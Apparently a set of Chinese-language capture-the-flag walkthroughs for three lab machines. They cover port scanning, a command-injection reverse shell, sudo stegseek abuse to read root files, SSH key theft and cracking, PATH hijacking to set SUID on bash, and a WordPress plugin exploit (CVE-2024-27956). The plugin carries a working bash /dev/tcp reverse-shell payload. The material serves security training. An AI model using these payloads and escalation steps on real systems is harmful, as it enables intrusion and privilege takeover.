信息搜集ip地址为&lt;INTERNAL_IP&gt; 
┌──(root㉿kali-plus)-[~]└─# rustscan -a &lt;INTERNAL_IP&gt; .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| || .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog         :: https://github.com/RustScan/RustScan : --------------------------------------RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. Open &lt;INTERNAL_IP&gt;:22Open &lt;INTERNAL_IP&gt;:80[~] Starting Script(s)[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 13:54 CSTInitiating ARP Ping Scan at 13:54Scanning &lt;INTERNAL_IP&gt; [1 port]Completed ARP Ping Scan at 13:54, 0.06s elapsed (1 total hosts)Initiating SYN Stealth Scan at 13:54Scanning lookup.hmv (&lt;INTERNAL_IP&gt;) [2 ports]Discovered open port 80/tcp on &lt;INTERNAL_IP&gt;Discovered open port 22/tcp on &lt;INTERNAL_IP&gt;Completed SYN Stealth Scan at 13:54, 0.03s elapsed (2 total ports)Nmap scan report for lookup.hmv (&lt;INTERNAL_IP&gt;)Host is up, received arp-response (0.0010s latency).Scanned at 2025-04-12 13:54:49 CST for 0sPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6480/tcp open  http    syn-ack ttl 64MAC Address: 08:00:27:EB:F5:F2 (Oracle VirtualBox virtual NIC)Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.20 seconds           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
获取 User Flag扫出来 22 和 80 端口。80 端口处存在命令执行，测试了一下延时命令可以正常生效，说明这个点是可利用的。之前扫到的 robots.txt 内容是一个 base64 编码字符串，解码后像是一组凭据信息，但直接拿去 SSH 登录并没有成功，所以还是回到命令执行这个入口，构造一个反弹 shell 即可。拿到 shell 之后先去找 user flag。
┌──(root㉿kali-plus)-[~]                                             └─# nc -lvnp 4444                                                      Listening on &lt;ATTACKER_IP&gt; 4444                                     Connection received on &lt;INTERNAL_IP&gt; 35044                            python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;                           www-data@AkaRed:/var/www/html$ ls                                       index.php  robots.txt                                              www-data@AkaRed:/var/www/html$ cd ..                                    www-data@AkaRed:/var/www$ cd ..                                         www-data@AkaRed:/var$ cd ..                                                   www-data@AkaRed:/$ ls                                                         bin   home            lib32       media  root  sys  vmlinuz           boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old          dev   initrd.img.old  libx32      opt    sbin  usr                     etc   lib             lost+found  proc   srv   var                     www-data@AkaRed:/$ cd home                                                    www-data@AkaRed:/home$ ls                                                     welcome                                                                 www-data@AkaRed:/home$ cd welcome                                             www-data@AkaRed:/home/welcome$ ls                                             user.txt                                                                      www-data@AkaRed:/home/welcome$ cat user.txt                  &lt;user flag&gt;
提权直接使用 sudo -l 会提示需要口令，但我们当时并不知道具体值，所以先上传 linpeas.sh，同时手动找一下可写目录。
www-data@AkaRed:/home/welcome$ find / -writable -type d 2&gt;/dev/null           find / -writable -type d 2&gt;/dev/null                                          /dev/mqueue                                                                   /dev/shm                                                                      /var/lib/php/sessions                                                         /var/tmp                                                                      /var/cache/apache2/mod_cache_disk                                             /run/lock                                                                     /run/lock/apache2                                                             /tmp                                                                          /proc/5217/task/5217/fd                                                       /proc/5217/fd                                                                 /proc/5217/map_files
发现 /tmp 目录可以写入。跑完 linpeas 之后，注意到 /opt 目录下存在一个 showmepassword 程序；结合提示信息，可以推断它会读取一个特定格式的输入文件。
//命令详解seq 1 1000 是生成从1到1000的数字序列每个数字占一行，后面的命令作用是：xargs 会将 seq 1 1000 的每一行输入（即 1 到 1000 的数字）替换到 &#123;&#125; 的位置，并执行 echo a 命令。由于 &#123;&#125; 被替换为输入的每一行，但实际上我们并不关心输入的内容，只是利用 xargs 来循环执行 echo a 最终得到的是1000行 a 
www-data@AkaRed:/tmp$ seq 1 1000 | xargs -I &#123;&#125; echo &quot;a&quot; &gt; xxoo                seq 1 1000 | xargs -I &#123;&#125; echo &quot;a&quot; &gt; xxoo                                      www-data@AkaRed:/tmp$ wc -l xxoo                                              wc -l xxoo                                                                    1000 xxoowww-data@AkaRed:/opt$ ./showmepassword                                        input to /tmp/xxoo                                                            when input 1000 count. u will get password                                   
这样就能拿到 welcome 用户的口令；除此之外，也可以直接用 strings showmepassword 去辅助分析。
welcome@AkaRed:~$ sudo -lMatching Defaults entries for welcome on AkaRed:    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binUser welcome may run the following commands on AkaRed:    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;stegseek
stegseek是一个图片隐写工具，可以把公钥写进图片里然后ssh连上去或者直接去把root.txt藏进flag里然后再提取出来```shellwelcome@AkaRed:~$ cd /tmp                                                     welcome@AkaRed:/tmp$ busybox wget http://&lt;ATTACKER_IP&gt;:9999/1.jpg             Connecting to &lt;INTERNAL_IP&gt;:9999 (&lt;INTERNAL_IP&gt;:9999)                         1.jpg                100% |*******************************************************************************************************************************************************************************************|  189k  0:00:00 ETA welcome@AkaRed:/tmp$ sudo stegseek --embed -cf /tmp/1.jpg -ef /root/root.txt  Enter passphrase:                                                             Re-Enter passphrase:                                                          embedding &quot;/root/root.txt&quot; in &quot;/tmp/1.jpg&quot;... done                            welcome@AkaRed:/tmp$ sudo stegseek --extract /tmp/1.jpg                       Enter passphrase:                                                             wrote extracted data to &quot;root.txt&quot;.                                           welcome@AkaRed:/tmp$ ls                                                       1.jpg  root.txt  systemd-private-9083634fc3114dc3a20156d7d4b69b13-apache2.service-J3gU2L  systemd-private-9083634fc3114dc3a20156d7d4b69b13-systemd-timesyncd.service-zSK17d                                              welcome@AkaRed:/tmp$ cat root.txt                                             &lt;root flag&gt;

信息搜集ip地址为&lt;INTERNAL_IP&gt;  开放22和80端口 ，80端口就是一个普通的页面，没啥功能点，扫一下目录
┌──(root㉿kali-plus)-[~] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://&lt;INTERNAL_IP&gt;/ -x.txt,.php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://&lt;INTERNAL_IP&gt;/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /tools (Status: 301) [Size: 314] [--&gt; http://&lt;INTERNAL_IP&gt;/tools/] /assets (Status: 301) [Size: 315] [--&gt; http://&lt;INTERNAL_IP&gt;/assets/] /.php (Status: 403) [Size: 278] /server-status (Status: 403) [Size: 278] Progress: 904349 / 3821499 (23.66%) [!] Keyboard interrupt detected, terminating. Progress: 905503 / 3821499 (23.69%) =============================================================== Finished ===============================================================
发现有一个tools，继续扫描tools目录下有啥，发现有一个docements目录，然后又三个html，貌似没什么用，然后assets目录下放的是一些图片，回头看了一下tools页面的源码，发现一个提示
&lt;!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html --&gt;
发现可以文件读取，可以读取&#x2F;ect&#x2F;passwd&lt;command&gt; 看看能不能读一下ssh密钥，根据刚刚得到的用户信息，读取gh0st用户的ssh连接私钥&lt;command&gt; 
&lt;REDACTED_PRIVATE_KEY&gt;
获取 User Flag但是用私钥还是需要密码，用john爆破一下
┌──(root㉿kali-plus)-[~] └─# ssh2john tmp &gt; hash.txt ┌──(root㉿kali-plus)-[~] └─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 16 for all loaded hashes Will run 16 OpenMP threads Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status celtic   (tmp) 1g 0:00:00:01 DONE (2025-04-24 15:45) 0.5524g/s 141.4p/s 141.4c/s 141.4C/s carolina..freedom Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed.
得到口令已脱敏celtic&#96; 尝试登录，但是一直没登录上去，看了一下发现是ssh密钥格式问题，格式对了然后输入口令已脱敏
gh0st@friendly2:~$ cat user.txt &lt;user flag&gt;

提权gh0st@friendly2:~$ sudo -l Matching Defaults entries for gh0st on friendly2: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User gh0st may run the following commands on friendly2: (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh gh0st@friendly2:~$ cd /opt gh0st@friendly2:/opt$ ls 0-day security.sh gh0st@friendly2:/opt$ file 0-day 0-day: directory gh0st@friendly2:/opt$ cd 0-day gh0st@friendly2:/opt/0-day$ ls names.txt gh0st@friendly2:/opt/0-day$ cat names.txt cat: names.txt: Permission denied  gh0st@friendly2:/opt/0-day$ cd .. gh0st@friendly2:/opt$ ls 0-day security.sh 
gh0st@friendly2:/opt$ cat security.sh#!/bin/bash echo &quot;Enter the string to encode:&quot; read string# Validate that the string is no longer than 20 characters if [[ $&#123;#string&#125; -gt 20 ]]; then     echo &quot;The string cannot be longer than 20 characters.&quot;     exit 1 fi # Validate that the string does not contain special characters if echo &quot;$string&quot; | grep -q &#x27;[^[:alnum:] ]&#x27;; then     echo &quot;The string cannot contain special characters.&quot;     exit 1 fi sus1=&#x27;A-Za-z&#x27; sus2=&#x27;N-ZA-Mn-za-m&#x27; encoded_string=$(echo &quot;$string&quot; | tr $sus1 $sus2) echo &quot;Original string: $string&quot; echo &quot;Encoded string: $encoded_string&quot;
这个bash脚本是对输入的内容进行rot13加密，脚本中用到了grep，但是没使用绝对路径，改个环境变量就好了
gh0st@friendly2:/opt$ cd /tmp gh0st@friendly2:/tmp$ echo &#x27;chmod +s /bin/bash&#x27; &gt; grep gh0st@friendly2:/tmp$ chmod +x grep gh0st@friendly2:/tmp$ ls grep systemd-private-8f30f03d74e0499ea061bbd4a882ad65-apache2.service-Zu9Zkg systemd-private-8f30f03d74e0499ea061bbd4a882ad65-systemd-logind.service-fRSdmh gh0st@friendly2:/tmp$ where is grep bash: where: command not found gh0st@friendly2:/tmp$ whereis grep grep: /usr/bin/grep /usr/share/man/man1/grep.1.gz /usr/share/info/grep.info.gz gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh Enter the string to encode: 123213The string cannot contain special characters. gh0st@friendly2:/tmp$ ls -l /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash gh0st@friendly2:/tmp$ bash -p bash-5.1# cd /root bash-5.1# ls interfaces.sh root.txt bash-5.1# cat root.txt Not yet! Try to find root.txt. Hint: ... bash-5.1# find / -name &quot;...&quot; 2&gt;/dev/null /... bash-5.1# cd /... bash-5.1# ls ebbg.txt bash-5.1# cat ebbg.txt It&#x27;s codified, look the cipher: 98199n723q0s44s6rs39r33685q8pnoq Hint: numbers are not codified
这里显示是没有被编码的，应该是需要用脚本加密一下，直接用赛博厨子加密一下就行，得到root flag为98199a723d0f44f6ef39e33685d8cabd

信息搜集确定ip地址为&lt;INTERNAL_IP&gt;，需要修改一下hosts文件 &lt;INTERNAL_IP&gt; mamushka ┌──(root㉿kali-plus)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:1d:89:b5, IPv4: &lt;INTERNAL_IP&gt;Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)&lt;INTERNAL_IP&gt; 3c:06:a7:fa:49:88 TP-LINK TECHNOLOGIES CO.,LTD.&lt;INTERNAL_IP&gt; e0:2e:0b:94:50:57 Intel Corporate&lt;INTERNAL_IP&gt; 12:d6:07:52:ab:25 (Unknown: locally administered)&lt;INTERNAL_IP&gt; 60:e3:2b:ab:61:39 Intel Corporate&lt;INTERNAL_IP&gt; 08:00:27:0e:de:b4 PCS Systemtechnik GmbH5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.103 seconds (121.73 hosts/sec). 5 responded
端口信息搜集 ┌──(root㉿kali-plus)-[~]└─# nmap -p- &lt;INTERNAL_IP&gt; Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 20:43 CSTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for &lt;INTERNAL_IP&gt;Host is up (0.0015s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:0E:DE:B4 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
获取 User Flag80端口是wordpress博客系统，肯定有个后台管理，但是不知道用户名和密码，现在的思路就是使用wpscan对网站进行扫描，但是wpscan需要一个api token，所以我选择使用nuclei ┌──(root㉿kali-plus)-[~/Desktop/nuclei_3.3.9_linux_amd64]└─# ./nuclei -u http://mamushka.hmv __ _ ____ __ _______/ /__ (_) / __ \/ / / / ___/ / _ \/ / / / / / /_/ / /__/ / __/ //_/ /_/\__,_/\___/_/\___/_/ v3.3.9 projectdiscovery.io[INF] Current nuclei version: v3.3.9 (outdated)[INF] Current nuclei-templates version: v10.1.5 (latest)[WRN] Scan results upload to cloud is disabled.[INF] New templates added in latest release: 281[INF] Templates loaded for current scan: 7754[INF] Executing 7565 signed templates from projectdiscovery/nuclei-templates[WRN] Loading 189 unsigned templates for scan. Use with caution.[INF] Targets loaded for current scan: 1[INF] Templates clustered: 1711 (Reduced 1609 Requests)[INF] Using Interactsh Server: oast.fun[openssh-detect] [tcp] [info] mamushka.hmv:22 [&quot;SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3&quot;][wordpress-readme-file] [http] [info] http://mamushka.hmv/readme.html[wordpress-login] [http] [info] http://mamushka.hmv/wp-login.php[CVE-2024-27956] [http] [critical] http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php[form-detection] [http] [info] http://mamushka.hmv[wordpress-xmlrpc-file] [http] [info] http://mamushka.hmv/xmlrpc.php[http-missing-security-headers:permissions-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:x-frame-options] [http] [info] http://mamushka.hmv[http-missing-security-headers:x-content-type-options] [http] [info] http://mamushka.hmv[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://mamushka.hmv[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:strict-transport-security] [http] [info] http://mamushka.hmv[http-missing-security-headers:content-security-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:referrer-policy] [http] [info] http://mamushka.hmv[http-missing-security-headers:clear-site-data] [http] [info] http://mamushka.hmv[mixed-passive-content:img] [http] [info] http://mamushka.hmv [&quot;http://mamushka.htb/wp-content/uploads/2024/08/mamushka-1.jpg&quot;,&quot;http://mamushka.htb/wp-content/uploads/2024/08/OIG5-1.jpeg&quot;,&quot;http://mamushka.htb/wp-content/uploads/2024/08/OIG4.jpeg&quot;] [tech-detect:font-awesome] [http] [info] http://mamushka.hmv[tech-detect:php] [http] [info] http://mamushka.hmv[wp-user-enum:usernames] [http] [low] http://mamushka.hmv/?rest_route=/wp/v2/users/ [&quot;admin&quot;][wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14[wp-license-file] [http] [info] http://mamushka.hmv/license.txt[addeventlistener-detect] [http] [info] http://mamushka.hmv[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14[apache-detect] [http] [info] http://mamushka.hmv [&quot;Apache/2.4.61 (Debian)&quot;][php-detect] [http] [info] http://mamushka.hmv [&quot;8.2.22&quot;]
明显扫描出来一个CVE-2024-27956搜了一下是插件的漏洞，并且找到了WP-Automatic这个插件，去exploit-db上搜了一下这个插件的poc，好像都不能用，试试在msf里面搜索 msf6 &gt; search WP-AutomaticMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/&lt;REDACTED_PASSWORD&gt; 2021-09-06 normal Yes WordPress Plugin Automatic Config Change to RCE 1 exploit/multi/http/wp_automatic_sqli_to_rce 2024-03-13 excellent Yes WordPress wp-automatic Plugin SQLi Admin Creation 2 \_ target: PHP In-Memory . . . . 3 \_ target: Unix/Linux Command Shell . . . . 4 \_ target: Windows Command Shell . . . .Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/wp_automatic_sqli_to_rceAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;Windows Command Shell&#x27;
搜到了一个24年比较新的，直接来使用试试 use exploit/multi/http/wp_automatic_sqli_to_rceshow optionsset rhost &lt;INTERNAL_IP&gt;run
msf6 exploit(multi/http/wp_automatic_sqli_to_rce) &gt; run[-] Handler failed to bind to &lt;INTERNAL_IP&gt;:4444:- -[*] Started reverse TCP handler on &lt;PUBLIC_IP&gt;:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[*] Attempting SQLi test to verify vulnerability...[+] The target is vulnerable. Target is vulnerable to SQLi![-] Exploit aborted due to failure: unexpected-reply: Failed to log in to WordPress admin.[*] Exploit completed, but no session was created.
这个脚本的作用就是添加一个用户，这个用户的用户名和口令已脱敏&lt;command&gt;，但是进去之后没地方反弹shell，看了一眼wp，是自己写的一个php脚本，然后打包成zip，这个脚本内容如下： &lt;?/*** Plugin Name: Reverse Shell Plugin* Plugin URI* Description: Reverse Shell Plugin* Version: 1.0* Author: Vince Matteo* Author URI: http://www.sevenlayers.com*/exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;INTERNAL_IP&gt;/1234 0&gt;&amp;1&#x27;&quot;);?&gt;
然后上传文件，点击激活插件，激活之前监听1234端口，这样就能把shell弹回来了，但是这个wordpress应该是docker搭建的，从&lt;command&gt;可以看出来，那就先看一下环境变量 www-data@3ed5ddfe0e0c:/var/www/html/wp-admin$ envHOSTNAME=3ed5ddfe0e0cPHP_VERSION=8.2.22APACHE_CONFDIR=/etc/apache2PHP_INI_DIR=/usr/local/etc/phpGPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DCPHP_LDFLAGS=-Wl,-O1 -piePWD=/var/www/html/wp-adminAPACHE_LOG_DIR=/var/log/apache2LANG=CPHP_SHA256=8566229bc88ad1f4aadc10700ab5fbcec81587c748999d985f11cf3b745462dfAPACHE_PID_FILE=/var/run/apache2/apache2.pidWORDPRESS_DB_HOST=dbPHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2cPHP_URL=https://www.php.net/distributions/php-8.2.22.tar.xzAPACHE_RUN_GROUP=www-dataAPACHE_LOCK_DIR=/var/lock/apache2SHLVL=2PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64WORDPRESS_DB_PASSWORD=&lt;REDACTED_PASSWORD&gt;APACHE_RUN_DIR=/var/run/apache2APACHE_ENVVARS=/etc/apache2/envvarsAPACHE_RUN_USER=www-dataWORDPRESS_DB_USER=matrioskaPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binWORDPRESS_DB_NAME=wordpressdbPHP_ASC_URL=https://www.php.net/distributions/php-8.2.22.tar.xz.ascPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64_=/usr/bin/env
